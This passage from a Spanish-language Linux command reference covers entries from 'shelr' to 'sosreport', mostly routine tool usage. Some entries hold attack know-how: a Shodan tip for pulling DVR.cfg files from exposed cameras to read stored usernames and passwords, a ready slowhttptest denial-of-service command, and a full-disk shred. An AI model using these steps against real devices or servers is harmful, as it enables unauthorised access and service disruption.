$ shelr play archivo.json (Reproduce el archivo volcado)
$ shelr play URL (Reproduce un remoto alojado en shelr.tv)
1.-
Proceso para subir la grabación a shelr.tv:
$ shelr setup 4dbde740509f4591bab88ca2361a269 (Especificar el ID de usuario. Este es ficticio)
$ shelr record (Empezar la grabación)
$ shelr push last (Subirla a shelr.tv)
$ shelr push last --private (Subirla a shelr.tv y mantenerla privada)


shift
En un script, permite desplazar los parámetros, de modo que el valor del 1er parámetro ($1) es reemplazado por el valor del 2do parámetro ($2), el del 2do parámetro ($2) por el del 3er parámetro ($3) y así sucesivamente. Veamos un ejemplo:
	$ mkdir tmp (creamos directorio de trabajo)
	$ cd tmp (entramos en él)
	$ touch {1..5}.txt (creamos varios archivos de texto)
Creamos un script con el siguiente contenido:
	#!/bin/bash
	#
	## Entrar un numero variable de archivos
	## como argumentos y comprimirlos con zip
	i=1
	while [ $# -gt 0 ]; do
	    zip ${1%%.*}.zip $1
	    i=$(($i+1))
	    shift
	done
	echo
Lo ejecutamos con algunos archivos como argumentos.
	./script.sh 1.txt 2.txt 3.txt
Comprobamos el resultado, los borramos:
$ rm *.txt
Y probamos con otro número de argumentos.


shodan
Buscador no de sitios web como google, yahoo o bing, sinó de dispositivos conectados a la red [routers, impresoras, camaras ip...]. Precisa registro con lo que aumenta la cantidad de salidas de las busquedas de 10 [sin registro] a 50.
Opciones generales en la barra de busquedas para usuarios sin cuenta pro:
	apache country:ES (Buscar servidores apache en España)
	apache city:Madrid country:ES (Buscar servidores apache en Madrid - España)
	nginx hostname:.es (Buscar servidores nginx con .es en su hostname)
	proftpd port:21 os:linux (Buscar servidores proftpd especificando puerto y sistema operativo)
	net:18.7.7.0/24 (Buscar en un rango de ips)
	Algunos ejemplos concretos:
	Server:SQ-WEBCAM country:es (Buscar webcams en España)
	netcam country:es (Cámaras ip en España)
1.-
Si lanzamos:
	dvr port:8080
Podemos buscar cámaras web. Una vez clicada la seleccionada de la busqueda, añadir a la ip /DVR.cfg, quedando la url: http://xx.xxx.xx.xx:8080/DVR.cfg, saldrá un archivo DVR.cfg para descargar. Descargarlo y editarlo. Buscar usuario y contraseña en USER1_USERNAME=XXXX y USER1_PASSWORD=XXXX


shodan-cli
Buscador de dispositivos.
# easy_install shodan (instalar paquete)
# shodan init YOUR_API_KEY (Entrar la API. Se encuentra en el perfil de usuario en shodan.com)
# shodan (Muestra las opciones)
# shodan count microsoft iis 6.0 (Muestra número de resultados de la busqueda)
# shodan download microsoft-data microsoft iis 6.0 (Guarda la busqueda en un fichero microsoft-data.json.gz)
# shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz (Analiza el archivo que se generó con el comando anterior, separando los campos ip, puerto y host con ",")
# shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0 (Generar una busqueda separando los campos especificados)
# shodan host IP (Analiza las vulnerabilidades del host especificado)
# shodan myip (Muestra la propia ip)
# cat archivo.txt | xargs -I% shodan download % % (download a partir de un listado. Pueden ser ips, modelos de router, camaras ip... una por linea)
# dir *json.gz -1 | xargs -I% shodan parse --fields ip_str,port,org --separator , % (Ver los resultados del comando anterior)


shopt
Habilita o deshabilita variables opcionales del comportamiento del shell bash.
$ shopt  (visualiza las activas y las inactivas)
$ shopt -s (visualiza las que estan activas)
$ shopt -s hostcomplete (activa una opción)
$ shopt -u hostcomplete (la desactiva)
Variables opcionales:
cdable_vars (Permite que cd use los valores de las variables como nombres de directorios)
cdspell (Ignora pequeños errores en los cambios de directorio con cd. Sólo en la ejecución interactiva)
cmdhist (Guarda los comandos que hemos escrito en varias líneas en una sola línea del historial)
dotglob (Incluye en la expansión de comodines los ficheros que empiezan por punto (.))
expand_aliases (Expande un alias cuando lo ejecuta)
extglob (Utiliza extensiones de los comodines)
failglob (Si falla la expansión de un comodín porque no encuentra nada falla el comando (como hace el C Shell))
force_fignore (Los sufijos especificados en la variable de entorno FIGNORE no se usan para completar palabras con tabulador)
hostcomplete (Se intenta completar nombres de host al pulsar tabulador cuando la palabra contiene una @)
interactive_comments (Permite que dentro de un comando de sesión interactiva haya comentarios (precedidos por #))
login_shell (Variable de sólo lectura que indica si Bash ha sido lanzado como un shell de login)
nocaseglob (Indica si los comodines expanden sin sensibilidad a mayúsculas/minúsculas. No confundir con la variable completion-ignore-case de inputrc que lo que hacía era expandir con tabulador.)
nullglob (Hace que cuando un patrón no encuentra ficheros, se expandan por la cadena vacía en vez de por el patrón sin expandir)
sourcepath (Hace que el comando interno source busque el argumento en los directorios que indique PATH)


shorewall
Cortafuegos.
# shorewall check (Chequea los archivos de configuración. Si finaliza con el mensaje "Shorewall configuration verified" todo está correcto)
# shorewall start (Arrancar el cortafuegos. "stop" para parar y "restart" para reiniciar)
# shorewall safe-start (Arrancar de forma segura. Aplicable tambien a safe-restart)
# shorewall clear (Desactivar todas las reglas de filtrado y enrutado)
# shorewall status (Ver el estado del firewall)
Configuración:
# nano /etc/default/shorewall
startup=1 (Aplicar las reglas al iniciar el sistema)
# nano /etc/shorewall/rules
Especificar los protocolos que se permitirán acceder a nuestra máquina des de el exterior:
SSH/ACCEPT	net	$FW
Equivalente a:
ACCEPT		net	$FW	tcp	22
Otro ejemplo:
Web/ACCEPT	net	$FW
Equivalente a:
ACCEPT		net	$FW	tcp	80
Otro para ftp:
FTP/ACCEPT	net	$FW
Equivalente a:
ACCEPT		net	$FW	tcp	21
Las opciones pueden ser DROP, ACCEPT y REJECT
Otros archivos de configuración:
/etc/shorewall/policy
/etc/shorewall/interfaces
/etc/shorewall/zones


show_all_colors
Muestra un listado de todos los colores disposibles.
$ show_all_colors


showconsolefonts
Muestra las fuentes de las ttys
$ showconsolefonts -v -C /dev/tty2 (Con información adicional y especificando la tty)


showfigfonts
Muestra las fuentes disponibles para el comando figlet.


showfsck
Mostrar el número de reinicios que faltan hasta forzar un chequeo fsck.
# showfsck


showkey
Muestra el código de la tecla pulsada.
$ showkey -a (arranca el prompt y mostrarà el código ascii de cada tecla que se pulse hasta finalizar con ctrl+d)


showrgb
listado de los colores reconocidos por el sistema y valor RGB
$ for line in {0..17}; do for col in {0..15}; do code=$(( $col * 18 + $line )); printf $'\e[38;05;%dm %03d' $code $code ;done; echo ;done (Muestra el código numérico de los 256 colores)
$ showrgb | grep red (Muestra el código)


shred
[secure-delete]. Borrar de forma segura espacios de disco
$ shred -fuv  archivo    (Borra archivo y sobreescribe su espacio  25 veces)
$ shred -zn10 /dev/sda (Borrar un disco sobreescribiendo 10 veces)
$ shred -fuv -n 50 archivo     (Lo mismo pero 50 veces)
$ shred -u -z -n 20 archivo.txt  (suprime un archivo y reescribe el espacio 20 veces con ceros)


shuf
Genera numeros aleatorio y muestra lineas de archivo de forma aleatoria.
$ shuf -n 4 /etc/fstab -o archivo (Muestra 4 lineas aleatorias del archivo y manda el resultado a "archivo")
$ shuf -i 1-49 -n 6 (para la loto. Numeros aleatorios de 1 al 49 y que muestre 6)
-i [x-y]  rango de números
-n   Cantidad de numeros a visualizar


shutdown
Apagar/reiniciar el pc.
$ shutdown -h now    (apagar ya)
$ shutdown -r now     (reiniciar ya)
# shutdown -h +20 (apagado dentro de 20 minutos)
# shutdown -c   (anula la cuenta regresiva anterior)
# shutdown -rF now  (forzar fsck en el reinicio)
# shutdown -h $((60 * 4)) (Apagar dentro de 4 horas)
# shutdown -h 20:30 -k "Se apagará a las 20 horas 30 minutos" (apagar a las 20,30 y mandando un mensaje a los usuarios)


shutdown-at-night
Programar apagados regulares de estaciones de trabajo. La secuencia de apagado se iniciará a través de CRON. Sin embargo, solo se apagarán las máquinas que aparezcan inactivas o sin uso. Las máquinas que estén en uso permanecerán en funcionamiento. El archivo de configuración en /usr/lib/shutdown-at-night/shutdown-at-night.


sic
Cliente IRC [protocolo para comunicación basada en texto en tiempo real, comúnmente utilizado para discusiones grupales, intercambio de archivos y juegos en línea]
$ sic -h host -n nickname -k pasword (Conéctese a un host determinado con el nickname y el password)
$ :j #channel (unirse a un canal)
$ :m #channel/user "hola user" (enviar un mensaje a un usuario de un canal)
$ :s #channel/user (establecer un canal o un usuario predeterminados)
$ :l #channel (salir de un canal)


signos y comodines
1
	Tecla barra inclinada (\)
	Delante de un comando indica que este se ejecuta tal cual, sin hacer uso de algún alias que pudiera tener.
	$ \ls
2
	Tecla asterisco (*)
	cualquier caracter o cadena de caracteres
	$ find /home/usuario -iname text*
3
	Interrogante cerrado (?)
	Substituye un solo caracter
	$ find /home/usuario -iname text?.txt
4
	Corchetes ([ ])
	Cualquier caracter que este dentro de los corchetes [a-g] ,  [12-32]
	$ find /home/usuario iname text[m-t].txt
5
	Dos admiraciones cerradas (!!)
	Repite el último comando.
	$ tail -f /var/log/fail2ban.log
	Permiso denegado
	$ sudo !!
	sudo tail -f /var/log/fail2ban.log
	Dime la contraseña....
6
	Signo mayor que (>)
	Antepuesto a un archivo, borra todo su contenido.
	$ > archivo
7
	Tecla espacio
	Anteponiendo un espacio delante de un comando este no se almacena en el historial.
8
	Acento circunflejo (^)
	Si al ejecutar un comando tecleamos mal una ruta, por ejemplo, confundiendo /home por /hmoe, podemos enmendar el error con:
 	$ ^hmoe^home


siggen
Utilidad que muestra los valores de la función hash para los archivos especificados.
$ siggen -a archivo.txt (muestra el hash en MD5, SHA, HAVAL y CRC32)
$ siggen -h archivo.txt (Los mismos hash pero en hexadecimal)
$ siggen -M archivo.txt (el hash solo en MD5. -S para SHA, -C para CRC32 y -H para HAVAL)
$ siggen -a archivo.txt archivo2.txt (para dos archivos)


signify-openbsd
Firmar y verificar archivos criptográficamente.
$ signify-openbsd -G -p clave.pub -s clave.sec -c "Pequeñas pruebas de claves" (Crear un par de claves con un mensaje)
$ signify-openbsd -S -s clave.sec -m bashrc -x bashrc.sig (Firmar una copia de .bashrc especificando un nombre de firma)
$ signify-openbsd -V -p clave.pub -m bashrc (Verificar una firma utilizando el nombre de firma predeterminado)
$ signify-openbsd -C -p clave.pub -x firma.sig (cualquiera que tenga la clave pública, puede verificar la firma)
Nota.- El archivo de clave privada ".sec" no debe compartirse con nadie. El archivo de clave pública ".pub" se puede compartir con cualquiera.


sigtool
Ver clamav


simhash
Se usa para calcular y comparar hashes de archivos de similitud.
$ simhash -c hash1 hash2


similarity-tester
Encuentra similitudes léxicas en textos en C, C ++, Java, Pascal, Modula-2, Lisp, Miranda y text. Esto se puede usar para detectar fragmentos de código potencialmente duplicados en grandes proyectos de software y para detectar plagio en software y proyectos basados en texto, educativos y de otro tipo. Los ejecutables empiezan por "sim_": sim_8086, sim_c, sim_c++, sim_java, sim_lisp, sim_m2, sim_mira, sim_pasc y sim_text.
$ sim_c *.c (resalta el código C duplicado en el directorio)
$ sim_text texto1.txt texto2.txt (de dos textos)


sinfo
Monitoreo de clústeres que utiliza transmisiones de red para distribuir información sobre el estado de los nodos locales, incluido el uso de CPU y memoria, la carga de red y los cinco procesos principales. Consiste en un demonio que se ejecuta en cada nodo y una interfaz de usuario ncurses para monitorearlos.
$ sinfo-client
$ sinfod


sistema gráfico
Instalar las X en UbuntuServer
# apt-get install ubuntu-desktop (Completo)
# apt-get install x-window-system-core gnome-core (mínimo)
# apt-get install language-pack-es language-pack-es-base language-pack-gnome-es language-pack-gnome-es-base language-selector language-support-es  (instalar los paquetes de idiomas en la instalación mínima))
# apt-get install gksu gnome-system-tools gnome-nettool (herramientas de red  y paquetes necesarios en la instalación mínima)
$ startx


skdet
Busca rootkits y puertos abiertos. Descarga wget http://dvgevers.home.xs4all.nl/skdet/skdet
# skdet -c (rootkits)
# skdet -p PID (sobre un PID)
# skdet -s (puertos abiertos)


skel
Directorio [/etc/skel/] que contiene ficheros y directorios que son automaticamente copiados al directorio personal al crear un nuevo usuario [ver useradd]. Las modificaciones que puedan realizarse en este directorio, ya sea añadiendo carpetas o modificando parámetros [en .bashrc, .profile...] no se aplicarán a usuarios existentes, sólo a los de nueva creación.


skill
Matar procesos.
# skill -l (Lista las señales pque pueden usarse)
# skill -L (otra forma de ver la lista)
# skill -KILL -u usuario (Matar todos los procesos de un usuario)
# skill -STOP -u usurario (Parar los procesos de un usuario)
# skill -CONT -u usuario (Reactivarlos)
# skill -KILL -v /dev/pts/* (Cerrar todas las sesiones de un sistema)
# skill -p PID (Matar el proceso)
# skill -c firefox (Matar por nombre aplicación)


sl
Un tren en consola.
$ sl -a (Aparece la palabra “help” en la cabina)
$ sl -l  (Muestra un tren más pequeño)
$ sl -F  (El tren vuela)
$ sl -e  (permite la interrupción con ^C)


slackpkg
Gestor de paquetes de Slackware sin resolución de dependencias. Como previa antes de su uso es preciso descomentar el repositorio de nuestra elección en /etc/slackpkg/mirrors
# slackpkg update gpg (Bajar llaves publicas)
# slackpkg update (Recargar listado)
# slackpkg upgrade-all (Actualizar toda la distro)
# slackpkg search paquete (buscar paquete)
# slackpkg install paquete (instalar paquete)
# slackpkg upgrade paquete (actualiza el paquete elegido)
# slackpkg reinstall paquete (reinstala paquete)
# slackpkg remove paquete (desinstala paquete)
# slackpkg blacklist paquete (pone el paquete en lista negra)
# slackpkg download paquete (descarga paquete sin instalarlo)
# slackpkg info paquete (muestra informacion de paquete)
# slackpkg clean-system (Lista los paquetes obsoletos)
# slackpkg install-new (Lista los paquetes introducidos recientemente)
# slackpkg generate-template (Generar una plantilla de los paquetes instalados en un pc)
# slackpkg install-template (Instalar un slackware en un pc a partir de una plantilla))


slay
Matar todos los procesos de un usuario.
$ slay usuario
$ slay -9 usuario


sleep
Esperar el tiempo especificado antes de lanzar un comando o aplicacion
$ sleep 5s ; xwd -root -screen > pantalla.xwd   (Capturar la pantallas tras 5 segundos)
$ sleep 20m; yes > /dev/dsp (alarma. En 20 minutos suena un pitido)
$ sleep 3s && aoss espeak -v es "Levantate gandul....." 2>/dev/null (Otra forma de programar una alarma)
$ sleep 3h && halt (para el pc a las 3 horas)
$ sleep 3d && halt (para el pc a los 3 dias)


sleepd
Demonio que pone un portátil en modo de suspensión si no se está utilizando o si la batería está baja.


sleepenh
Programa especialmente diseñado para ejecutar algunas funciones periódicamente en un script de shell. No fue diseñado para ser preciso lanzarlo como un comando de consola, sino para ser útil en una secuencia que precisa "sleeps" sucesivos. Un ejemplo de scritp:
#!/usr/bin/env bash
#
TIMESTAMP=$(sleepenh 0)
while true; do
# Imprimir en pantalla el texto
echo -n "Linux es genial ";
sleepenh 0;
# mostrar cada 2 segundos el texto
TIMESTAMP=$(sleepenh $TIMESTAMP 2.0);
done


slim
Gestor de sesiones ligero. La configuración en el archivo /etc/slim.conf
$ slim -p /usr/share/slim/themes/tema_a_probar
Una vez escogido el tema lo colocamos en /etc/slim.conf substituyéndolo por el "default":
    current_theme          default
1.-
Si al usar systemd el sistema no para ni reinicia, modificar las lineas existentes por las siguientes:
halt_cmd /usr/bin/systemctl halt
reboot_cmd /usr/bin/systemctl reboot


slowhttptest
Efectuar ataques Slow Http Dos
$ slowhttptest -c 1000 -H -g -o ataque -i 10 -r 200 -t GET -u http://192.168.1.154 -x 30 -p 3
c (Número de conexiones con límite en 65539)
H (ataque modo SlowLoris enviando paquetes sin completar)
B (ataque modo Slow POST sin terminar de enviar el cuerpo del mensaje)
X (ataque modo Slow Read de lectura de las respuestas http lentas)
g (Generr estadistica en formato html)
o (Archivo de salida)
i (Intervalo de datos por segundo por conexión)
r (Conexiones por segundo)
t (Cabecera a utilizar)
u (URL de destino)
x (Longitud máxima de los datos)
p (Tiempo de espera de respuesta http una vez el servidor se considera inaccesible)


slurm
Monitoriza la interfaz de red
# slurm -i eth0


smartmontools
Comprobar el estado de los discos duros. Contiene los programas smartctl y smartd para controlar y supervisar los sistemas de almacenamiento mediante el sistema S.M.A.R.T. [Self-Monitoring, Analysis and Reporting Technology System]
# smartctl --scan (información relevante sobre los dispositivos de almacenamiento disponibles)
# smartctl --all /dev/nvme0n1p5 (imprime toda la información SMART de la partición nvme0n1p5)
# smartctl -iHs on /dev/nvme0n1p5 ("i" información, "H" estado de salud del dispositivo y "s on" habilita o deshabilita SMART en el dispositivo )
# smartctl -c /dev/nvme0n1p5 (verificar las capacidades SMART del dispositivo)
# smartctl -Hc /dev/sda (Si al final se lee PASSED, correcto, si FAILED cambiar disco)
# smartctl -t short /dev/sda (lanzar el test corto)
# smartctl -t long /dev/sda (ejecutar un test largo)
# smartctl -l error /dev/sda (Listar los errores)
# smartctl -l selftest /dev/nvme0n1p5 (muestra una lista con los resultados de las autopruebas recientes en orden cronológico inverso)
Nota- "LifeTime" indica las horas que el disco ha estado encendido. "LBA_of_First_error" indica los errores.
# update-smart-drivedb (actualiza /var/lib/smartmontools/drivedb/drivedb.h o DESTFILE desde branch/RELEASE_7_3_DRIVEDB del repositorio SVN de smartmontools)
# smartd (arrancar el daemon)
# sed -i 's/DEVICESCAN -d removable -n standby -m root -M exec/#DEVICESCAN -d removable -n standby -m root -M exec/' /etc/smartd.conf (comentar la opción DEVICESCAN en el archivo de configuración predeterminado para evitar que smartd intente buscar dispositivos conectados de forma indiscriminada)
# smartctl -A /dev/sda (Listar atributos internos)
Listado de algunos atributos smart
	Power_Cycle_Count (RAW_Value).- Veces que le ha llegado corriente.
	Temperature Celsius. (RAW_Value) .- Temperatura del disco
	Reallocated_Sector_Ct (RAW_Value).-  número de sectores de repuesto que ha usado el disco para sustituir sectores dañados
	Raw_Read_Error_Rate (RAW_Value).- Frequencia de errores en la lectura del disco.
	Start_Stop_Count: Cantidad de veces que se ha parado y arrancado el disco
	Seek_Error_Rate: Tasa de errores de colocación de la aguja
	Power_On_Seconds: Tiempo funcionando
	Spin_Retry_Count: Numero de reintentos de arrancada
El campo VALUE [valor] va del número 1 al 253, siendo 1 el peor. Los valores normales son los que estan entre 100 y 200. El campo WHEN_FAILED indica cuando se produjo una falla de algún atributo.
1.-
Otra forma de activar el demonio que nos avisa si se produce un error en disco:
# apt install smart-notifier
Editar el archivo de configuración:
# nano /etc/default/smartmontools
Y descomentar la linea:
start_smartd=yes
2.- El propósito de SMART es supervisar la confiabilidad del disco duro y predecir fallas del disco y realizar diferentes tipos de pruebas automáticas del disco. La ubicación predeterminada para estas notificaciones y advertencias SYSLOG normalmente se realizan en /var/log/messages o /var/log/syslog
3.- Comprobar si el disco es HDD o SSD
# smartctl -a /dev/nvme0n1p1 (comprobar si el disco es HDD o SSD)
Nota- Tambien podemos lanzar
# cat /sys/block/loop0/queue/rotational
Si el resultado es 1 es HDD si es 0 es SSD


smbclient
Conectar recursos compartidos de windows desde linux.
$ smbclient //192.168.1.155/compartido -U usuario (Después de ingresar usuario y contraseña entra en el prompt del recurso compartido)
$ smbclient -L //192.168.1.155 (Ver los recursos compartidos de la IP especificada.
1.-
Para montarlo automaticamente:
Entrar en el /etc/fstab la siguiente linea:
//192.168.1.155/compartido /media/compartido cifs username=NOMBRE, password=CONTRASEÑA,user


smbstatus
Monitorizar el estado de las conexiones del servidor samba.
# smbstatus (Listado de equipos conectados a recursos compartidos y ficheros abiertos)
# smbstatus -p (Solo el listado de los equipos conectados a samba)
# smbstatus -S (Listado de recursos y equipos conectados a ellos)
# smbstatus -L  (Listado de ficheros abiertos)


smem
Informa del uso de la memoria.
# smem -u (Por parte de los usuarios)
# smem -w (por parte del sistema)
# smem -m (de todos los procesos)
# smem -p (resultado en porcentaje


smemstat
Informa del uso de la memoria física en consideración con la memoria compartida.
# smemstat -T (Mostrar los principales consumidores de memoria)
# smemstat -t (modo interactivo mostrando los principales cambios en la memoria)
# smemstat -p tmux,firefox (mostrar el consumo de tmux y firefox)
# smemstat -g -p tmux,firefox57 (el resultado en gigabytes. -m en megabytes -k en kilobytes)


snap
[snapd]. Formato de paquete universal desarrollado por Canonical que tienen como objetivo proporcionar una forma fácil y segura de distribuir software en cualquier distribución Linux, eliminando las dependencias del sistema y asegurando que las aplicaciones funcionen sin problemas en diferentes entornos porque incluyen todas las dependencias del paquete. Los paquetes de instalan en /snap/nombre_paquete y lo ejecutables en /snap/bin y pueden convivir junto a los del mismo nombre en el sistema. Si por ejemplo, lanzamos:
$ emacs
Se ejecutará la aplicación del sistema. Si queremos el instalado con snap, lanzamos la ruta absoluta:
$ /snap/bin/emacs
Una vez instalado el programa snap:
# systemctl enable --now snapd.socket (habilitar el servicio)
# systemctl status snapd (comprobar si esta habilitado)
# snap install core (componente esencial para ejecutar paquetes Snap)
# snap refresh (actualizar todas las aplicaciones)
# snap install vlc (instalar una aplicación)
$ snap info vlc (información sobre una aplicación)
$ snap find telegram (buscar si un paquete existe en snap)
@ snap refresh vlc (actualizar una aplicación)
# snap remove vlc --purge (eliminar una aplicación)
$ snap list (listar aplicaciones snap instaladas)
$ snap changes (ver si existen detalles de actualizaciones)
# snap revert paquete (instalar una versión anterior de un paquete)


snarf
Descarga páginas web o listado de archivos compartidos por ftp.
$ snarf lapipaplena.net (Creará un archivo index.html)
$ snarf ftp://usuario:contraseña@servidor (Creará un archivo ftpindex.txt)


sniffit
Snifer de red. Dado que los informes los despliega en archivos de texto por cada dato, es preferible lanzar la aplicación desde dentro de una carpeta para no llenar todo el directorio de ficheros.
# sniffit -s 192.168.1.2  (Captura todos los paquetes con origen en la IP)
# sniffit -t 192.168.1.2 (Captura todos los paquetes con destino en la IP)
# sniffit -b -s 192.168.1.2 (Captura los paquetes con origen y destino en la IP)
# sniffit -F eth1 -b -s 192.168.1.33 -p 9001 (de un puerto y forzando dispositivo)


snoopy
librería que se encarga de almacenar comandos y el usuario que los ejecuta.
$ git clone https://github.com/a2o/snoopy.git
$ cd snoopy
$ ./configure
$ make
# make install
# make enable
Reiniciar los servicios que tengamos funcionando [apache2, ssh...]
# /etc/init.d/ssh restart
Monitorizar el archivo log de registro com:
# tail -f /var/log/auth.log


snooze
Herramienta parecida a cron. Ejecutar un comando en un momento determinado.
$ snooze -H 22 -M 10 musica.wav (empezar a sonar la música mencionada a las 22'10)
$ snooze -d 15 -m 3 -H 20 -M 30 -- ~/script.sh (ejecutar el script mencionado el 15 de marzo a las 8'30 de la tarde)


snort
Sniffer de paquetes y detector de intrusos
# snort -v -i eth0 (Para inspeccionar el tráfico de una red)
# snort -vde -h 192.168.0.1/24 (Inspeccionar una dirección o rango)
# snort -vde tcp (especificando protocolo)
# snort -v -X -i eth0 port 25 (Especificando un puerto y guardando la información)
# snort -v -X -i eth0 -n 5 port 25 (Capturando solo 5 paquetes)
La tarjeta de red tiene que estar en modo promiscuo
Opciones
-v          sniffer de TCP
-d y -e    Para obtener las cabeceras


sntop
Utilidad tipo top (ver), que sondea una lista de hosts en un intervalo regular para determinar si están en línea. Si no se especifica el archivo en el que constan los datos, lee de /etc/sntoprc. Tambien puede especificarse otro.
# sntop -f .sntoprc -e salida.html (especificando el archivo con los hosts y nombre de archivo de salida. Por defecto sntop.html)
# sntop -n 60 -a ~/file (especificando un tiempo en segundos de refresco de datos. Por defecto 180 y que ejecute file si uno de los host especificados se cae)
Durante la ejecución del programa pueden pulsarse la siguientes teclas:
	r (refrescar)
	w (escribir la salida en un archivo)
	q (salir)
	pulsado cualquier tecla tambien se refresca la salida
Un ejempo de archivo sntoprc seria:
	templix
	192.168.1.35
	mi server a toda pastilla
	#
	La Pipa Plena
	lapipaplena.org
	El de la asociacion
	#
	otro pc
	192.168.1.145
	el del comedor


socklist
[procinfo]. Lista conectores de red abiertos (sockets), mostrando tipo, número de puerto y otros datos específicos.
$ socklist


socklog
Herramienta utilizada para gestionar los registros [logs] del sistema. Incluye las aplicaciones socklog-check , tryto (intenta ejecutar un comando limitado por un tiempo de espera o un número de intentos), uncat y socklog-conf (configura un servicio)
# socklog-check (comprueba la disponibilidad de un servicio. En caso de éxito, devuelve 0)
# socklog -r inet 127.0.0.1 80 (activar mensajes sin formato del servicio inet de la ip y puerto mencionados)
# uncat -v -t 20 -s 2048 inet (verbose, tiempo, 20 segundos [por defecto 300], 2048 de tamaño [por defecto 1024] y servicio inet)
# tryto nginx (si el comando falla devuelve código de salida 0)
# socklog-conf USER GRUPO directorio_de_servicio directorio_de_log (los que ejcutaran el servicio, donde se crearán los directorios de supervisión y donde se almacenan los registros)


sockperf
Utilidad de evaluación comparativa de red diseñada para probar el rendimiento y latencia de la red.
$ sockperf tp -i 127.0.0.1 (prueba de rendimiento unidireccional a la ip mencionada)
$ sockperf ul -i 127.0.0.1 (pruebas de latencia bajo carga)


sockstat
[procinfo]. Mostrar información sobre las conexiones abiertas [sockets].
$ sockstat -l (muestra todas)
$ sockstat -P 2522 (las del PID indicado)
$ sockstat -p 443 (las del puerto indicado)
$ sockstat -U USER (las del usuario especificado)


softflowd
Analizador de tráfico de red basado en flujo capaz de exportar datos de Cisco Netflow. Rastrea los flujos de tráfico registrados escuchando en una interfaz de red o leyendo un archivo de captura de paquetes.
$ softflowd -i enp1s0 (que escuche en la interfaz enp1s0 y se ejecute solo en modo de recopilación de estadísticas)
$ softflowd -i enp1s0 -n 10.1.0.2:4432 (de la interfaz enp1s0 y exporte datagramas a un recopilador que se ejecuta en 10.1.0.2 4432)
$ softflowd -i enp1s0 -n 10.1.0.2:4432,10.1.0.3:4432 (de la interfaz y se exporten datagramas que se ejecutan en los puertos 4432 10.1.0.2 y 4432 10.1.0.3)
$ softflowd -i enp1s0 -l -n 10.1.0.2:4432,10.1.0.3:4432 (enviando los paquetes netflow impares al puerto 10.1.0.2 4432 y los pares al puerto 10.1.0.3 4432)
$ softflowd -v 5 -i enp1s0 -n 10.1.0.2:4432 -m 65536 -t udp=1m30s (aumenta la cantidad de flujos simultáneos a rastrear a 65536 y el tiempo de espera a 90'')
$ softflowd -i enp1s0 -p /var/run/sfd.pid.enp1s0 -c /var/run/sfd.ctl.enp1s0 ( especifica ubicaciones alternativas para el socket de control y el archivo pid)


somafm
Escuchar cualquiera de las emisoras de somafm desde la terminal. Bajar el script de github y darle permisos
$ wget https://raw.githubusercontent.com/rockymadden/somafm-cli/master/src/somafm
$ chmod +x somafm
O instalarlo con pip:
$ pip3 install somafm
$ somafm -l (listar las emisoras)
$ somafm -s (mostrar oyentes actuales)
$ somafm -p beatblender (conectar la escogida)
$ somafm -p "Groove Salad Classic" (lo mismo)
$ somafm -r (seleccione aleatoriamente uno de los canales actualmente activos)
$ curl -s -H 'Accept: application/json' https://somafm.com/channels.json | jq -r '.channels | sort_by(.listeners | tonumber) | reverse | .[]' | jq -r '.id + " | " + .listeners + " listeners | " + .description' | column -t -s\| (listado de forma más bonita)


sonic
Acelerar o ralentizar archivos wav de voz con una distorsión mínima.
$ sonic -s 3.4 archivo_voz.wav archivo_voz_rapito.wav (aumentaría la velocidad de la entrada en un factor de 3,4 y escribir el resultado en archivo_voz_rapido.wav)
$ sonic -s 2.5 -v 1.5 voz.wav voz_lenta.wav (ralentizar voz.wav en un factor de 2,5, aumentar volumen un 50% y el resultado en voz_lenta.wav)
$ sonic -p 2.0 grave.wav aguda.wav (que una voz grave suene aguda)


sonido
1.-
Para ver las tarjetas de sonido instaladas
$ cat /proc/asound/cards
0 [Intel ]: HDA-Intel - HDA Intel
HDA Intel at 0xe4100000 irq 169
1 [SAA7134 ]: SAA7134 - SAA7134
saa7133[0] at 0xe4000000 irq 233
2 [CMI8738MC6 ]: CMI8738-MC6 - C-Media PCI CMI8738-MC6
C-Media PCI CMI8738-MC6 (model 55) at 0xa000, irq 225
# asoundconf set-default-card 1 (para activar la 1)
Editar el fichero /etc/alsa/alsa.conf y poner estas líneas:
	defaults.ctl.card 1
	defaults.pcm.card 1
	defaults.pcm.device 1
Los cambios son automáticos, no hay ni que reiniciar el servicio.
2.-
Cuando al reiniciar el sonido aparece silenciado:
# gedit /etc/pulse/default.pa
Comentar la linea: # load-module module-device-restore
3.-
Sin sonido con flash
Si no existe, crear el archivo:
$ sudo touch /etc/asound.conf
# nano /etc/asound.conf
Pegar:
	pcm.pulse {
	type pulse
	}
	ctl.pulse {
	type pulse
	}
	pcm.!default {
	type pulse
	}
	ctl.!default {
	type pulse
	}
Reiniciar.
4.-
Si Java bloquea el dispositivo de sonido en lugar de usar Pulseaudio
# cd /usr/lib/jvm/java-6-sun/jre/bin/
# mv java java.bin
# nano /usr/lib/jvm/java-6-sun/jre/bin/java
Y copiar en su interior:
#!/bin/bash
padsp /usr/lib/jvm/java-6-sun/jre/bin/java.bin "$@"
# chmod +x java (darle permisos)
5.-
Substituir pulseaudio por alsa:
# apt-add-repository ppa:dtl131/ppa  (Añadir los repositorios gnome-media/applets/settings-daemon)
# apt-get update  (Actualizar el sistema)
# apt-get upgrade
# apt-get install esound esound-clients esound-common libesd-alsa0 alsa-base alsa-tools alsa-utils alsa-oss linux-sound-base python-alsaaudio gnome-media libsdl1.2debian-alsa  (Instalar paquetes de alsa)
# apt-get purge libcanberra-pulse pulseaudio pulseaudio-esound-compat pulseaudio-module-bluetooth pulseaudio-module-gconf pulseaudio-module-udev pulseaudio-module-x11 gstreamer0.10-pulseaudio pulseaudio-utils pavucontrol  (Desinstalar los paquetes de pulseaudio)
Reiniciar


sort
Muestra la entrada ordenada.
$ sort archivo > archivo_ordenado  (por la primera columna)
$ sort  [intro] (va esperando palabras o números que ordena con Ctrl+d)
$ sort << fin (Lo mismo pero ordena después de introducir “fin”)
$ sort -o archivo1 archivo1 (escribe el resultado en el propio archivo)
$ sort -u fichero  (ordenar eliminando lineas repetidas)
$ sort -t , -k2n archivo  (ordenar por el segundo campo separado del primero por una “,” y por su valor numérico)
$ sort -t , -k3 archivo   (ordenar por el tercer campo separados por comas)
Opciones
-f : Ordena alfabeticamente (diferencia Minúsculas y mayúsculas).
-n : Para ordenar los campos numéricos por su valor numérico.
-r : De mayor a menor.
-R : desordenar, aleatoriamente
-k numero : Especifica por qué columna o campo realizar la ordenación
-t : indica que vamos a usar un delimitador de campo especificado
-u : Suprime todas las líneas repetidas después de realizar la ordenación.


sosreport
